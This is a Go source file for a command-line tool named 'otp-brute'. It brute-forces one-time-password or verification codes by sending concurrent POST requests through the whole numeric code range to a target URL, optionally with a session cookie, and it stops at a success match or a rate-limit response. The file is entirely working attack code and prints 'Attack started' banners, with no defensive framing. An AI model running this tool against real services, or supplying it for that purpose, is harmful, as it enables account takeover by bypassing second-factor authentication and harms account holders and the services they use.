package main

import (
	"bytes"
	"context"
	"flag"
	"fmt"
	"io"
	"math"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func worker(ctx context.Context, id int, client *http.Client, targetURL string, dataTemplate string, contentType string, cookie string, expectedStatus int, matchText string, jobs <-chan string, results chan<- string, wg *sync.WaitGroup, processed *uint64, updateStep uint64, totalJobs uint64, cancel context.CancelFunc, startTime time.Time) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		case otp, ok := <-jobs:
			if !ok {
				return
			}

			payload := strings.Replace(dataTemplate, "OTP", otp, -1)

			req, err := http.NewRequestWithContext(ctx, "POST", targetURL, bytes.NewBuffer([]byte(payload)))
			if err != nil {
				continue
			}

			req.Header.Set("Content-Type", contentType)
			if cookie != "" {
				req.Header.Set("Cookie", cookie)
			}

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			if resp.StatusCode == 429 {
				elapsed := time.Since(startTime).Round(time.Millisecond)
				results <- fmt.Sprintf("\r\033[K[!] Rate Limit (429 Too Many Requests) hit! Stopped at code: %s | Time: %v\n", otp, elapsed)
				cancel()
				resp.Body.Close()
				return
			}

			bodyBytes, _ := io.ReadAll(resp.Body)
			bodyString := string(bodyBytes)
			resp.Body.Close()

			current := atomic.AddUint64(processed, 1)

			if current%updateStep == 0 || current == totalJobs {
				percentage := (float64(current) / float64(totalJobs)) * 100
				elapsed := time.Since(startTime).Round(time.Second)
				fmt.Printf("\r\033[K[~] %d/%d (%.1f%%) | Code: %s | Status: %d | Time: %v ...", current, totalJobs, percentage, otp, resp.StatusCode, elapsed)
			}

			isSuccess := false
			if matchText != "" {
				if strings.Contains(bodyString, matchText) {
					isSuccess = true
				}
			} else {
				if resp.StatusCode == expectedStatus {
					isSuccess = true
				}
			}

			if isSuccess {
				elapsed := time.Since(startTime).Round(time.Millisecond)
				preview := bodyString
				if len(preview) > 200 {
					preview = preview[:200] + "..."
				}
				results <- fmt.Sprintf("\r\033[K[+] Valid OTP found: %s | Status: %d | Time: %v | Response: %s\n", otp, resp.StatusCode, elapsed, preview)
				cancel()
			}
		}
	}
}

func main() {
	urlPtr := flag.String("u", "", "")
	dataPtr := flag.String("d", "", "")
	threadsPtr := flag.Int("t", 50, "")
	statusPtr := flag.Int("s", 200, "")
	rangePtr := flag.String("r", "6", "")
	cookiePtr := flag.String("c", "", "")
	matchPtr := flag.String("m", "", "")
	flag.Parse()

	if *urlPtr == "" || *dataPtr == "" {
		fmt.Println("Usage: otp-brute -u <URL> -d <DATA> [-t <threads>] [-r <range>] [-s <status>] [-c <cookie>] [-m <match_text>]")
		os.Exit(1)
	}

	trimmedData := strings.TrimSpace(*dataPtr)
	contentType := "application/x-www-form-urlencoded"
	if strings.HasPrefix(trimmedData, "{") && strings.HasSuffix(trimmedData, "}") {
		contentType = "application/json"
	}

	start := 0
	end := 999999
	format := "%06d"

	if strings.Contains(*rangePtr, "-") {
		parts := strings.Split(*rangePtr, "-")
		if len(parts) == 2 {
			start, _ = strconv.Atoi(parts[0])
			end, _ = strconv.Atoi(parts[1])
			format = fmt.Sprintf("%%0%dd", len(parts[0]))
		}
	} else {
		length, err := strconv.Atoi(*rangePtr)
		if err == nil && length > 0 {
			end = int(math.Pow(10, float64(length))) - 1
			format = fmt.Sprintf("%%0%dd", length)
		}
	}

	totalJobs := uint64(end - start + 1)
	updateStep := totalJobs / 1000
	if updateStep == 0 {
		updateStep = 1
	}
	var processed uint64 = 0

	fmt.Printf("[*] Attack started...\n[*] Target: %s\n[*] Range: %d - %d\n[*] Threads: %d\n", *urlPtr, start, end, *threadsPtr)
	if *matchPtr != "" {
		fmt.Printf("[*] Match method: Text search for '%s'\n\n", *matchPtr)
	} else {
		fmt.Printf("[*] Match method: HTTP Status %d\n\n", *statusPtr)
	}

	t := &http.Transport{
		MaxIdleConns:        *threadsPtr,
		MaxIdleConnsPerHost: *threadsPtr,
		MaxConnsPerHost:     *threadsPtr,
		IdleConnTimeout:     30 * time.Second,
		DisableCompression:  true,
	}

	client := &http.Client{
		Transport: t,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	startTime := time.Now()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	jobs := make(chan string, *threadsPtr)
	results := make(chan string, 10)
	var wg sync.WaitGroup

	for w := 1; w <= *threadsPtr; w++ {
		wg.Add(1)
		go worker(ctx, w, client, *urlPtr, *dataPtr, contentType, *cookiePtr, *statusPtr, *matchPtr, jobs, results, &wg, &processed, updateStep, totalJobs, cancel, startTime)
	}

	go func() {
		for res := range results {
			fmt.Print(res)
		}
	}()

	go func() {
		for i := start; i <= end; i++ {
			select {
			case <-ctx.Done():
				close(jobs)
				return
			case jobs <- fmt.Sprintf(format, i):
			}
		}
		close(jobs)
	}()

	wg.Wait()

	totalElapsed := time.Since(startTime).Round(time.Millisecond)

	if ctx.Err() == nil {
		fmt.Printf("\r\033[K[*] Brute-force finished successfully. Total time: %v\n", totalElapsed)
	} else {
		fmt.Printf("\r\033[K[-] Process terminated. Total time: %v\n", totalElapsed)
	}
}
